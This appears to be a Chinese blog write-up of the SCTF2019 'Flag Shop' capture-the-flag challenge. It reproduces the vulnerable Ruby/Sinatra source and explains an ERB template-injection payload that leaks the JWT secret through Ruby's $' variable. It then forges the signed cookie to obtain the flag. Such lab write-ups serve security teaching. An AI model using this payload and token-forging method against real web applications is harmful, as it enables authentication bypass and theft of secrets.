---
title: '[SCTF2019]Flag Shop 1'
categories:
  - 
tags: []
abbrlink: 8435138c
date: 2026-03-01 21:29:13
---
# [SCTF2019]Flag Shop

# 1

`ERB` 的全称是 *Embedded Ruby*（嵌入式 Ruby），其实就是个动态模板



---

扫到robots.txt

打开发现filebak

![image-20260301205057132](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301205057132.png)

filebak打开看到代码

```
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]	//我们的目标在这ma?
      输出位置（关键）：puts 指令在服务端编程中是把内容打印到 服务器的控制台（黑窗口），而不是返回给你的 浏览器页面。即便你触发了这一行，Flag 也只是印在选手的服务器后台，你在屏幕上什么也看不到。
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```



1.

```
if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
```

我们让传入的secret为空，就变成了`ENV["SECRET"].match(" ")`,当而外面的match匹配到了空，

$'的意思为选取 “匹配成功后的后面的全部字符”

那$'为key了



2.

```
if params[:do] == "#{params[:name][0,7]} is working" then

    ...
    
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
	//最后 .result 返回处理完的纯 HTML 给浏览器
```

我们要在这里插入`name=<%=$'%>`

erb就回去找$'，然后用result把结果给我们看



3.

但这里需要params[:do] == "#{params[:name][0,7]} is working"

`do=<%=$'%> is working`



payload



```
?name=<%=$'%>&do=<%=$'%> is working&SECRET=
```

拿到key

![image-20260301211735220](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301211735220.png)

key：

```
63d90e4f927ffcb3e25521ee51110a546eaf3f47f016b1e749ef6ba0ab321133c9e14c3483a838e0db99ce91f47042e4d5cc5f36e1b39a57c57a37afebb50abe
```

去改cookie

https://www.bejson.com/jwt/

![image-20260301212132917](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301212132917.png)



抓包上传cookie

源代码里面是post，不是get，要注意一下

![image-20260301212547871](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301212547871.png)

得到

![image-20260301212205681](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301212205681.png)

解码

![image-20260301212240348](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260301212240348.png)